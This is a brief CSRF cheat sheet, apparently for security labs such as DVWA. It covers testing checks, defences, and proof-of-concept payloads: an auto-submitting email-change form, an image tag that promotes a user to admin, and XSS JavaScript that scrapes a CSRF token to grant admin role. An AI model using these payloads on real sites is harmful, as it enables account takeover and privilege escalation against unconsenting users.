# CSRF — Cross-Site Request Forgery

The browser automatically attaches cookies to requests to a site, even when another site triggers
them. If a state-changing request has **no unpredictable token** and cookies aren't
`SameSite=Lax/Strict`, any page can make the logged-in victim perform it.

## Check
- State-changing request (change password/email/role, transfer, add admin) — any CSRF token field?
  Is it validated (remove it / change it / reuse another user's)?
- Does it work as GET? (`SameSite=Lax` still sends cookies on top-level GET navigations.)
- Cookie attributes: `SameSite=None` or missing on old browsers.

## PoC page (host it, make the bot visit it, or inject via stored XSS)
```html
<form id=f action="http://TARGET/profile/email" method=POST>
  <input name=email value="attacker@x.com">
</form><script>f.submit()</script>
<!-- GET variant -->
<img src="http://TARGET/admin/promote?user=me">
```
Via XSS on the same origin, tokens don't help — read the token first, then post:
```js
fetch('/settings').then(r=>r.text()).then(h=>{let t=h.match(/name="csrf_token" value="([^"]+)/)[1];
 fetch('/settings',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
 body:'csrf_token='+t+'&role=admin'})})
```

## Defences (deck)
Synchronizer tokens (random per form), cookie-to-header token, `SameSite=Lax/Strict`, double-submit
cookie; verify `Origin`/`Referer` as extra layer.

Seen in: DVWA "CSRF", bWAPP, Mutillidae CSRF labs.
